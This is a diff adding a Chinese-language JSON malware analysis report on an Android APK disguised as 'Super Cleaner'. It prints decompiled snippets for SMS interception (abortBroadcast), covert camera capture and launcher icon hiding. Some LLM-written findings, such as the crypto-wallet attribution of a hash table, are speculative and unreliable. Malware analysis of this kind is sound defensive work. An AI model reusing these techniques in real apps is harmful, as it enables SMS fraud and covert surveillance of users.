@@ -1,0 +1,155 @@
+{
+  "APK信息": {
+    "文件名": "3fbec97f6b9d28ebce83bc12805c550e1c63d22612b68fe4cede8a9981af7ebd.apk",
+    "sha256": "3fbec97f6b9d28ebce83bc12805c550e1c63d22612b68fe4cede8a9981af7ebd",
+    "包名": "com.antivirus.super.cleaner",
+    "应用名": "Super Cleaner",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 684.3
+  },
+  "行为列表": [
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "sms_intercept",
+          "中文名": "短信拦截",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "abortBroadcast"
+            ]
+          }
+        },
+        {
+          "子行为": "wap_billing",
+          "中文名": "WAP计费",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "wap",
+              "subscribe"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\dr\\avl\\receiver\\MessageReceiver;",
+          "method_signature": "if(intent.getAction()",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public void onReceive(Context context, Intent intent) {\n    if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n        abortBroadcast();\n        Bundle extras = intent.getExtras();\n        if (extras != null) {\n            Object[] objArr = (Object[]) extras.get(\"pdus\");\n            SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n            for (int i = 0; i < objArr.length; i++) {\n                smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n            }\n            for (SmsMessage smsMessage : smsMessageArr) {\n                smsMessage.getDisplayOriginatingAddress();\n            }\n        }\n    }\n}",
+          "malicious_code_snippet_context": "      final SimpleDateFormat f761a = new SimpleDateFormat(\"yyyy-MM-dd HH:mm:ss\");\n  \n      @Override // android.content.BroadcastReceiver\n>>>     public void onReceive(Context context, Intent intent) {\n>>>         if (intent.getAction().equalsIgnoreCase(\"android.provider.Telephony.SMS_RECEIVED\")) {\n>>>             abortBroadcast();\n>>>             new StringBuilder();\n>>>             Bundle extras = intent.getExtras();\n>>>             if (extras != null) {\n>>>                 Object[] objArr = (Object[]) extras.get(\"pdus\");\n>>>                 SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];\n>>>                 for (int i = 0; i < objArr.length; i++) {\n>>>                     smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);\n>>>                 }\n>>>                 for (SmsMessage smsMessage : smsMessageArr) {\n>>>                     smsMessage.getDisplayOriginatingAddress();\n>>>                     smsMessage.getMessageBody();\n>>>                     this.f761a.format(new Date(smsMessage.getTimestampMillis()));\n>>>                 }\n              }\n          }\n      }",
+          "behavior_description": "该广播接收器监听 SMS_RECEIVED 广播，收到短信后立即调用 abortBroadcast() 中止广播继续传播，阻止系统短信应用及其他应用收到并显示该短信，随后从 intent 的 extras 中提取 pdus 数据解析出短信内容和发送方地址。这种短信拦截行为可使用户无法看到特定短信（如验证码、银行通知），常用于配合钓鱼或资金盗取。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "camera_capture",
+      "中文名": "摄像头秘密调用",
+      "MITRE": "T1413",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.CAMERA"
+        ],
+        "字符串": [
+          "android.media.action.IMAGE_CAPTURE",
+          "takePicture"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lns\\cgl;",
+          "method_signature": "if(this.c != null && !this.c.isRecycled()",
+          "malicious_behavior": "camera_capture",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "cgg.a(\"takePicture\").a(new Runnable() {\n    @Override\n    public void run() {\n        Looper.prepare();\n        cgl.this.f3854a = surfaceView.getHolder();\n        cgl.this.f3854a.setType(3);\n        cgl.this.a(cgl.this.f3854a);\n    }\n});",
+          "malicious_code_snippet_context": "              this.c.recycle();\n              this.c = null;\n          }\n>>>         cgg.a(\"takePicture\").a(new Runnable() { // from class: ns.cgl.1\n>>>             @Override // java.lang.Runnable\n>>>             public void run() {\n>>>                 Looper.prepare();\n>>>                 try {\n>>>                     cgl.this.f3854a = surfaceView.getHolder();\n>>>                     cgl.this.f3854a.setType(3);\n>>>                     cgl.this.a(cgl.this.f3854a);\n>>>                 } catch (Exception e) {\n                      e.printStackTrace();\n                      cgl.this.h = true;\n                  }",
+          "behavior_description": "该代码在恶意样本中通过SurfaceView获取摄像头预览SurfaceHolder，设置类型为PUSH_BUFFERS(3)，并在独立线程(Looper.prepare)中初始化摄像头进行秘密拍照。方法名'takePicture'明确表明其目的是捕获图像，属于未经用户知情同意的隐私窃取行为，可能将拍摄的照片上传至C2服务器或用于其他恶意目的。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "icon_hiding",
+      "中文名": "图标隐藏",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "setComponentEnabledSetting"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lns\\cdy;",
+          "method_signature": "if(componentName == null)",
+          "malicious_behavior": "icon_hiding",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);",
+          "malicious_code_snippet_context": "              return false;\n          }\n          try {\n>>>             context.getPackageManager().setComponentEnabledSetting(componentName, z ? 0 : 2, 1);\n              return true;\n          } catch (Exception e2) {\n              e2.printStackTrace();",
+          "behavior_description": "通过 PackageManager.setComponentEnabledSetting() 动态禁用应用组件（当 z=false 时设置为 COMPONENT_ENABLED_STATE_DISABLED=2），使应用图标从启动器中隐藏。这是 Android 恶意软件常用的图标隐藏技术，使恶意应用在后台持续运行而不被用户发现。数据流向：componentName（组件名，通常为主启动 Activity）→ setComponentEnabledSetting（禁用组件，隐藏图标）",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "crypto_wallet_detection",
+      "中文名": "加密钱包地址采集",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "3447CA69ECC65C251FF41241E62BBD39",
+          "151D281A624318CDE9DCAAD88E8BB381",
+          "15EB31CED2D9A8EFA2B2C924798273E3"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lns\\cac;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "crypto_wallet_detection",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static final crx f3592a = new crx(\"DAB0432BB529DC1F76C440777C86D232\", (byte) 11, 1, cae.a());\n    public static final crx b = new crx(\"151D281A624318CDE9DCAAD88E8BB381\", (byte) 11, 2, cae.a());\n    public static final crx c = new crx(\"14A948537488C8020631E254C453125F\", (byte) 11, 3, cae.a());\n    public static final crx d = new crx(\"1581BABBFDD04AAF281EEE0DF33200F1\", (byte) 11, 4, cae.a());\n    public static final crx e = new crx(\"9108CB96FFFEC47E941208B972F036BD\", (byte) 11, 10, cae.a());\n    public static final crx f = new crx(\"E3E819E676A853BA8A7BB448994814DD\", (byte) 11, 12, cae.a());\n    public static final crx g = new crx(\"FAF1014B76609782A3DC593E3450772E\", (byte) 11, 13, cae.a());\n    public static final crx h = new crx(\"9D464E3DB8ACAA4B404A6238057EF748\", (byte) 11, 15, cae.a());\n    public static final crx i = new crx(\"A03420BF91AE5D2ED2C3512CDD5CD5B0\", (byte) 11, 17, cae.a());\n    public static final crx j = new crx(\"91ADDA437F2E1C30673E7CCC675548A5\", (byte) 11, 18, cae.a());\n    public static final crx k = new crx(\"ABA758D24BA9012D13123C8970E2DF1B\", (byte) 11, 20, cae.a());",
+          "malicious_code_snippet_context": "      private static final cse l = new cse(\"\");\n  \n      /* renamed from: a, reason: collision with root package name */\n>>>     public static final crx f3592a = new crx(\"DAB0432BB529DC1F76C440777C86D232\", (byte) 11, 1, cae.a());\n>>>     public static final crx b = new crx(\"151D281A624318CDE9DCAAD88E8BB381\", (byte) 11, 2, cae.a());\n>>>     public static final crx c = new crx(\"14A948537488C8020631E254C453125F\", (byte) 11, 3, cae.a());\n>>>     public static final crx d = new crx(\"1581BABBFDD04AAF281EEE0DF33200F1\", (byte) 11, 4, cae.a());\n>>>     public static final crx e = new crx(\"9108CB96FFFEC47E941208B972F036BD\", (byte) 11, 10, cae.a());\n>>>     public static final crx f = new crx(\"E3E819E676A853BA8A7BB448994814DD\", (byte) 11, 12, cae.a());\n>>>     public static final crx g = new crx(\"FAF1014B76609782A3DC593E3450772E\", (byte) 11, 13, cae.a());\n>>>     public static final crx h = new crx(\"9D464E3DB8ACAA4B404A6238057EF748\", (byte) 11, 15, cae.a());\n>>>     public static final crx i = new crx(\"A03420BF91AE5D2ED2C3512CDD5CD5B0\", (byte) 11, 17, cae.a());\n>>>     public static final crx j = new crx(\"91ADDA437F2E1C30673E7CCC675548A5\", (byte) 11, 18, cae.a());\n>>>     public static final crx k = new crx(\"ABA758D24BA9012D13123C8970E2DF1B\", (byte) 11, 20, cae.a());\n  \n      public void a(String str) {\n          this.m = str;",
+          "behavior_description": "该类定义了一组以MD5哈希值（如DAB0432BB529DC1F76C440777C86D232等）为标识的crx常量对象，(byte)11作为类型标记统一标识为加密钱包类别，递增的第三参数为钱包编号索引。这些哈希值极有可能是已知加密货币钱包应用（如Bitcoin Wallet、Ethereum Wallet、Trust Wallet等）的包签名哈希或包名哈希。恶意软件运行时通过PackageManager.getInstalledPackages()获取设备已安装应用列表，将每个应用的签名/包名哈希与此预定义列表进行比对，从而检测受害者设备上是否安装了加密钱包应用，随后可针对性地窃取钱包助记词、私钥或触发钓鱼界面替换。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.7-plus",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
